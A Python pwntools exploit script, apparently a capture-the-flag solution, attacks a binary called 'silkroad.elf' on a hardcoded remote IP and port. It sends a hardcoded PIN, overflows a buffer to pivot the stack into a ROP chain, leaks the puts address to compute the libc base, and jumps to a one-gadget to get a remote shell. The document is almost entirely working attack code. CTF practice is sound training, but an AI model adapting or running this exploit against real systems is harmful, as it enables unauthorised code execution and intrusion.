#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('silkroad.elf')

host = args.HOST or '82.196.10.106'
port = int(args.PORT or 58399)
env={'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'}

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env,gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env,*a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --


from time import sleep
# pin code 790317143
context.terminal = ['tmux', 'split', '-h']
io = start()
io.recv()
io.send(str(790317143))
io.recv()
io.send("DreadPirateRobertsA" + p32(31337))
io.recv()

rop = ROP(exe)
#rop.raw(0x0000000000401bab) # pop rdi
#rop.raw(0x00000000004022A2) # string format
#rop.raw(0x0000000000401130) # scanf
#rop.raw(0x0) # stdin fd
#rop.raw(0x00000000004010A0) # read
#rop.raw(0x4017CE) # open read print
#rop.read(0, 0x401030)
#rop.raw(0x00000000004017cb) # pop rsp; pop rbp; ret

rop.read(0, 0x403028 + 0x900) # read into writable area
rop.raw(0x0000000000401298) # leave; ret; -> same as mov rsp, rbp; pop rbp; ret;
log.info(rop.dump())

payload ="A" * (0x40-9) + p64(0x403020 + 0x900) * 2 + rop.chain()
log.info(hex(len(payload)))
io.sendline(payload)
sleep(2)
rop = ROP(exe)
rop.raw(0x0000000000401219)
rop.raw(0x403030 + 0x100 + 0x900)

#rop.read(3, 0x403000)
#rop.read(0, 0x403000)
rop.puts(exe.got['puts'])
#rop.read(0, 0x403000)
rop.read(0, 0x403958)

log.info(rop.dump())
payload = rop.chain()
io.send(payload)
sleep(2)

io.recvuntil('!\n')
data = unpack(io.recvline().strip() + "\x00" * 2)
log.info(data)
data= data-0x0809c0#- 0x0000000000071e50
log.success(hex(data))
sleep(2)
io.send("/bin/aa\x00" + p64(0xbeefcafe) * 4 + p64(data+0x10a38c))
sleep(2)
io.sendline('ls')

io.interactive()

